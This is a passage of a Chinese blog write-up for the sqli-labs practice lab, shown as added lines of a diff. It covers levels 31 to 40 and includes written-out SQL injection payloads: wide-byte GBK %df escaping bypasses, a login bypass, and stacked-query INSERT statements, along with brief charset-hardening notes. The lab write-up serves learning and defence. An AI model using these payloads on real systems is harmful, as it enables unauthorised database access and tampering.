+<h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><p>在前面的基础上又加了一个 <code>()</code>。</p>
+<hr>
+<p>Less-32,33,34,35,36,37六关全部是针对 <code>’</code> 和  <code>\</code> 的过滤，可用宽字节绕过</p>
+<p>原理：<code>mysql</code> 在使用 <code>gbk</code> 编码的时候，会将两个字符当做一个汉字。例如 <code>%aa%5c</code> ，前一个 <code>ASCII</code> 码超过 <code>128</code> 才会达到汉字的范围。</p>
+<h3 id="Less-32-Bypass-custom-filter-adding-slashes-to-dangerous-chars"><a href="#Less-32-Bypass-custom-filter-adding-slashes-to-dangerous-chars" class="headerlink" title="Less-32 Bypass custom filter adding slashes to dangerous chars"></a>Less-32 Bypass custom filter adding slashes to dangerous chars</h3><p>干掉 slash 有如下方法</p>
+<p>1、<code>%df</code>  吃掉 <code>\</code>   具体的原因是 <code>urlencode(‘)  = %5c%27</code>，我们在 <code>%5c%27</code> 前面添加 <code>%df</code>，形成 <code>%df%5c%27</code>，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时 <code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>2、将 <code>\’</code> 中的 <code>\</code> 过滤掉，例如可以构造 <code>%**%5c%5c%27</code> 的情况，后面的 <code>%5c</code> 会被前面的 <code>%5c</code> 给注释掉。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%df' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p>那第二种方法？</p>
+<h3 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h3><p><code>Addslashes()</code> 函数依旧可以利用 <code>%df</code> 进行绕过。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下列字符将被加上 <span class="symbol">\ </span>进行转义</span><br><span class="line">单引号（'）		双引号（"）		反斜杠（<span class="symbol">\）</span>		NULL</span><br></pre></td></tr></table></figure>
+<p><strong>Notice：</strong>使用 <code>addslashes()</code> ，我们需要将 <code>mysql_query</code> 设置为 <code>binary</code> 的方式，才能防御此漏洞。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</span><br></pre></td></tr></table></figure>
+<h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>此处是 <code>post</code>，将 <code>utf-8</code> 转换为 <code>utf-16</code> 或 <code>utf-32</code>，例如将 <code>‘</code>  转为 <code>utf-16</code>为  �’  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=�' <span class="keyword">or</span> 1#&amp;<span class="attribute">passwd</span>=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>35 关和 33关是大致的一样的，唯一的区别在于 <code>sql</code> 语句的不同。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>没有 <code>‘</code>，就没必考虑 <code>addslashes()</code> 函数的意义了</p>
+<h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$string = mysql_real_escape_string($string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下列字符将受影响</span></span><br><span class="line">\x00	\n		\r		\		<span class="string">'		"		\x1a</span></span><br></pre></td></tr></table></figure>
+<p>依然宽字节注入</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="symbol">%EF</span><span class="symbol">%BF</span><span class="symbol">%BD</span><span class="symbol">%27</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
+<p><strong>Notice:</strong><br>在使用 <code>mysql_real_escape_string()</code> 时，需要将 <code>mysql</code> 设置为 <code>gbk</code> 即可。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mysql_set_charset</span><span class="params">(‘gbk’,’<span class="variable">$conn</span>’)</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>利用 34 关的 payload</p>
+<hr>
+<p>以下正式进入堆叠注入，即</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
+<p>由于 <code>sql</code> 语句是以 <code>;</code> 分隔，所以在查询语句的基础，我们还可以加多条语句。</p>
+<hr>
+<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>没有什么过滤，可以为所欲为，比如直接插入数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27;<span class="keyword">insert</span>%<span class="number">20</span><span class="keyword">into</span>%<span class="number">20</span><span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>)%<span class="number">20</span><span class="keyword">values</span>%<span class="number">20</span>(%<span class="number">2738</span>%<span class="number">27</span>,%<span class="number">27</span>less38%<span class="number">27</span>,%<span class="number">27</span>hello%<span class="number">27</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>同 38，只是没有 <code>‘’</code>。</p>
+<h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>没有任何防护，得到字段名之后就可以直接往里插入数据</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>;%<span class="number">20</span>insert%<span class="number">20</span>into%<span class="number">20</span>users(id,username,password)%<span class="number">20</span>values%<span class="number">20</span>(%<span class="number">27110</span>%<span class="number">27</span>,%<span class="number">27</span>less41%<span class="number">27</span>,%<span class="number">27</span>hello%<span class="number">27</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>做到这里有点无聊就没做了，待更新。</p>
+</blockquote>
+<h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p><code>order by</code> 配合 <code>rand()</code> </p>
+<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
+            </p><p>原文链接：<a href="https://wywwzjj.top/2019/01/02/Sqli-labs-通关记录/">https://wywwzjj.top/2019/01/02/Sqli-labs-通关记录/</a>
+            </p><p>发表日期：<a href="https://wywwzjj.top/2019/01/02/Sqli-labs-通关记录/">January 2nd 2019, 10:23:07 am</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2019/01/02/Sqli-labs-通关记录/">May 1st 2019, 9:49:52 am</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/01/30/2019-Fireshell-Web-Vice/" title="2019 fireshell web Vice">
+                    <div class="nextTitle">2019 fireshell web Vice</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/01/02/POJ-2352-Stars-树状数组/" title="POJ-2352-Stars[树状数组]">
+                    <div class="prevTitle">POJ-2352-Stars[树状数组]</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="//github.com/wywwzjj" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title="qq">
+                  
+                  <img class="profile-qr" src="/assets/QQ.png">
+                </span>
+            
+        
+    
+        
+    
+        
+            
+                <a href="mailto:wywwzjj@gmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        
+        
+        <span id="busuanzi_container_site_pv" class="theme-info">
+            |&nbsp;&nbsp;总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;&nbsp;次
+        </span>
+        <span id="busuanzi_container_site_uv" class="theme-info">
+            &nbsp;&nbsp;|&nbsp;&nbsp;访客数&nbsp;<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;人次&nbsp;&nbsp;|
+        </span>
+        <!-- <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span> -->
+        
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#预备知识"><span class="toc-number">1.</span> <span class="toc-text">预备知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-常用语句备忘"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL 常用语句备忘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入类型"><span class="toc-number">1.2.</span> <span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#union-注入"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">union 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#information-schema-注入"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">information_schema 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#函数报错信息注入"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">函数报错信息注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#insert-update-delete-注入"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">insert / update / delete 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#http-header-注入"><span class="toc-number">1.2.0.5.</span> <span class="toc-text">http header 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#布尔盲注"><span class="toc-number">1.2.0.6.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#时间盲注"><span class="toc-number">1.2.0.7.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用注入写入后门"><span class="toc-number">1.2.0.8.</span> <span class="toc-text">利用注入写入后门</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">1.3.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#空格"><span class="toc-number">1.3.1.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#引号"><span class="toc-number">1.3.2.</span> <span class="toc-text">引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#逗号"><span class="toc-number">1.3.3.</span> <span class="toc-text">逗号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#比较符"><span class="toc-number">1.3.4.</span> <span class="toc-text">比较符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#条件连接词"><span class="toc-number">1.3.5.</span> <span class="toc-text">条件连接词</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#union-select-where"><span class="toc-number">1.3.6.</span> <span class="toc-text">union, select, where</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#表名等关键词"><span class="toc-number">1.3.7.</span> <span class="toc-text">表名等关键词</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注释符"><span class="toc-number">1.3.8.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#等号"><span class="toc-number">1.3.9.</span> <span class="toc-text">等号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#部署练习平台"><span class="toc-number">1.4.</span> <span class="toc-text">部署练习平台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开始闯关"><span class="toc-number">2.</span> <span class="toc-text">开始闯关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1-Error-based-Single-quotes"><span class="toc-number">2.1.</span> <span class="toc-text">Less-1 Error based - Single quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2-Error-based-Double-quotes"><span class="toc-number">2.2.</span> <span class="toc-text">Less-2 Error based - Double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3-Error-based-Single-quotes-with-twist"><span class="toc-number">2.3.</span> <span class="toc-text">Less-3 Error based - Single quotes with twist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4-Error-based-Double-Quotes"><span class="toc-number">2.4.</span> <span class="toc-text">Less-4 Error based - Double Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5-Double-Injection-Single-Quotes"><span class="toc-number">2.5.</span> <span class="toc-text">Less-5 Double Injection - Single Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6-Double-Injection-Double-Quotes"><span class="toc-number">2.6.</span> <span class="toc-text">Less-6 Double Injection - Double Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7-Dump-into-outfile"><span class="toc-number">2.7.</span> <span class="toc-text">Less-7 Dump into outfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8-Blind-Boolean-Based-Single-Quotes"><span class="toc-number">2.8.</span> <span class="toc-text">Less-8 Blind - Boolean Based - Single Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9、Less-10-这两个与-8-类似"><span class="toc-number">2.9.</span> <span class="toc-text">Less-9、Less-10 这两个与 8 类似</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11-Error-Based-Single-quotes"><span class="toc-number">2.10.</span> <span class="toc-text">Less-11 Error Based - Single quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12"><span class="toc-number">2.11.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13"><span class="toc-number">2.12.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14"><span class="toc-number">2.13.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15-Less-16"><span class="toc-number">2.14.</span> <span class="toc-text">Less-15 Less-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17"><span class="toc-number">2.15.</span> <span class="toc-text">Less-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18-Header-Injection-Uagent-field-Error-based"><span class="toc-number">2.16.</span> <span class="toc-text">Less-18 Header Injection  - Uagent field - Error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19-Header-Injection-Referer-field-Error-based"><span class="toc-number">2.17.</span> <span class="toc-text">Less-19 Header Injection  - Referer field - Error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20-Cookie-injection-Uagent-field-Error-based"><span class="toc-number">2.18.</span> <span class="toc-text">Less-20 Cookie injection - Uagent field - Error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21-Less-22-与前面的类似"><span class="toc-number">2.19.</span> <span class="toc-text">Less-21 Less-22 与前面的类似</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-23"><span class="toc-number">2.20.</span> <span class="toc-text">Less-23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-24-Second-Oder-Injections-Real-treat-Stored-injection"><span class="toc-number">2.21.</span> <span class="toc-text">Less-24 Second Oder Injections Real treat - Stored injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25-Error-Based-All-your-OR-amp-AND-belong-to-us-integer-based"><span class="toc-number">2.22.</span> <span class="toc-text">Less-25 Error Based - All your OR &amp; AND belong to us - integer based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25a-Blind-Based-All-your-OR-amp-AND-belong-to-us-integer-based"><span class="toc-number">2.23.</span> <span class="toc-text">Less-25a Blind Based - All your OR &amp; AND belong to us - integer based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-26-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us（待研究）"><span class="toc-number">2.24.</span> <span class="toc-text">Less-26 Error based - All your SPACES and COMMENTS belong to us（待研究）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-26a-Blind-based-All-your-SPACES-and-COMMENTS-belong-to-us"><span class="toc-number">2.25.</span> <span class="toc-text">Less-26a Blind based - All your SPACES and COMMENTS belong to us</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-27-Error-based-All-your-UNION-and-SELECT-belong-to-us"><span class="toc-number">2.26.</span> <span class="toc-text">Less-27 Error based - All your UNION and SELECT belong to us</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-27a"><span class="toc-number">2.27.</span> <span class="toc-text">Less-27a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-28"><span class="toc-number">2.28.</span> <span class="toc-text">Less-28</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-28a"><span class="toc-number">2.29.</span> <span class="toc-text">Less-28a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-29"><span class="toc-number">2.30.</span> <span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-30"><span class="toc-number">2.31.</span> <span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-31"><span class="toc-number">2.32.</span> <span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-32-Bypass-custom-filter-adding-slashes-to-dangerous-chars"><span class="toc-number">2.33.</span> <span class="toc-text">Less-32 Bypass custom filter adding slashes to dangerous chars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-33-Bypass-addslashes"><span class="toc-number">2.34.</span> <span class="toc-text">Less-33 Bypass addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-34"><span class="toc-number">2.35.</span> <span class="toc-text">Less-34</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-35"><span class="toc-number">2.36.</span> <span class="toc-text">Less-35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-36"><span class="toc-number">2.37.</span> <span class="toc-text">Less-36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-37"><span class="toc-number">2.38.</span> <span class="toc-text">Less-37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-38"><span class="toc-number">2.39.</span> <span class="toc-text">Less-38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-39"><span class="toc-number">2.40.</span> <span class="toc-text">Less-39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-40"><span class="toc-number">2.41.</span> <span class="toc-text">Less-40</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-41"><span class="toc-number">2.42.</span> <span class="toc-text">Less-41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-42"><span class="toc-number">2.43.</span> <span class="toc-text">Less-42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-43"><span class="toc-number">2.44.</span> <span class="toc-text">Less-43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-44"><span class="toc-number">2.45.</span> <span class="toc-text">Less-44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-45"><span class="toc-number">2.46.</span> <span class="toc-text">Less-45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-46"><span class="toc-number">2.47.</span> <span class="toc-text">Less-46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-47"><span class="toc-number">2.48.</span> <span class="toc-text">Less-47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-48"><span class="toc-number">2.49.</span> <span class="toc-text">Less-48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-49"><span class="toc-number">2.50.</span> <span class="toc-text">Less-49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-50"><span class="toc-number">2.51.</span> <span class="toc-text">Less-50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-51"><span class="toc-number">2.52.</span> <span class="toc-text">Less-51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-52"><span class="toc-number">2.53.</span> <span class="toc-text">Less-52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-53"><span class="toc-number">2.54.</span> <span class="toc-text">Less-53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-54"><span class="toc-number">2.55.</span> <span class="toc-text">Less-54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-55"><span class="toc-number">2.56.</span> <span class="toc-text">Less-55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-56"><span class="toc-number">2.57.</span> <span class="toc-text">Less-56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-57"><span class="toc-number">2.58.</span> <span class="toc-text">Less-57</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-58"><span class="toc-number">2.59.</span> <span class="toc-text">Less-58</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-59"><span class="toc-number">2.60.</span> <span class="toc-text">Less-59</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 30
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/01</span><a class="archive-post-title" href="/2019/05/01/Upload-labs-通关记录/">Upload-labs-通关记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/2019-DDCTF-Web-Writeup/">2019 DDCTF Web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span><a class="archive-post-title" href="/2019/04/07/vulnhub-靶机实战系列-HackInOS/">vulnhub-靶机实战系列-HackInOS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
